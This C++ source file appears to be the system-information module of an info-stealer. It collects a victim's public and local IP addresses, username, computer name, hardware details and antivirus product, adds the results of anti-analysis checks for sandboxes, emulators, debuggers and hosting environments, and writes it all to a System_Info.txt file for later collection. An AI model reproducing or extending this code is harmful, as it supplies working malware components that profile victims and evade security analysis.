#include "Info.h"
#include <iostream>

#include "SystemInfo.h"
#include "AntiAnalysis.h"
#include <fstream>

void Info::Save(std::string sSavePath)
{
	try
	{
		std::string  systemInfoText = std::string("")
			+ "\n************[IP]************"
			+ "\nExternal IP: " + SystemInfo::getPublicIpAsync()
			+ "\nInternal IP: " + SystemInfo::getLocalIp()
			+ "\nGateway IP: " + SystemInfo::getDefaultGateway()
			+ "\n"
			+ "\n************[Machine]************"
			+ "\nUsername: " + SystemInfo::getUserName()
			+ "\nCompname: " + SystemInfo::getComputerName()
			+ "\nSystem: " + SystemInfo::getSystemVersion()
			+ "\nCPU: " + SystemInfo::getCpuName()
			+ "\nGPU: " + SystemInfo::getGpuName()
			+ "\nRAM: " + SystemInfo::getRamAmount()
			+ "\nDATE: " + SystemInfo::getDateTime()
			+ "\nSCREEN: " + SystemInfo::getScreenMetrics()
			+ "\nBATTERY: " + SystemInfo::getBattery()
			+ "\n"
			+ "\n************[Virtualization]************"
			//+ "\nVirtualMachine: " + std::to_string(AntiAnalysis::VirtualBox())
			+ "\nSandBoxie: " + std::to_string(AntiAnalysis::SandBox())
			+ "\nEmulator: " + std::to_string(AntiAnalysis::Emulator())
			+ "\nDebugger: " + std::to_string(AntiAnalysis::IsDebuggerPresentByException())
			+ "\nProcesse: " + std::to_string(AntiAnalysis::Processes())
			+ "\nHosting: " + std::to_string(AntiAnalysis::HostingAsync())
			+ "\nAntivirus: " + SystemInfo::getAntivirus();
		+"\n";

		sSavePath += "\\System_Info.txt";
		std::ofstream outfile(sSavePath);
		outfile << systemInfoText;
		outfile.close();

	}

	catch (const std::exception&)
	{

	}
}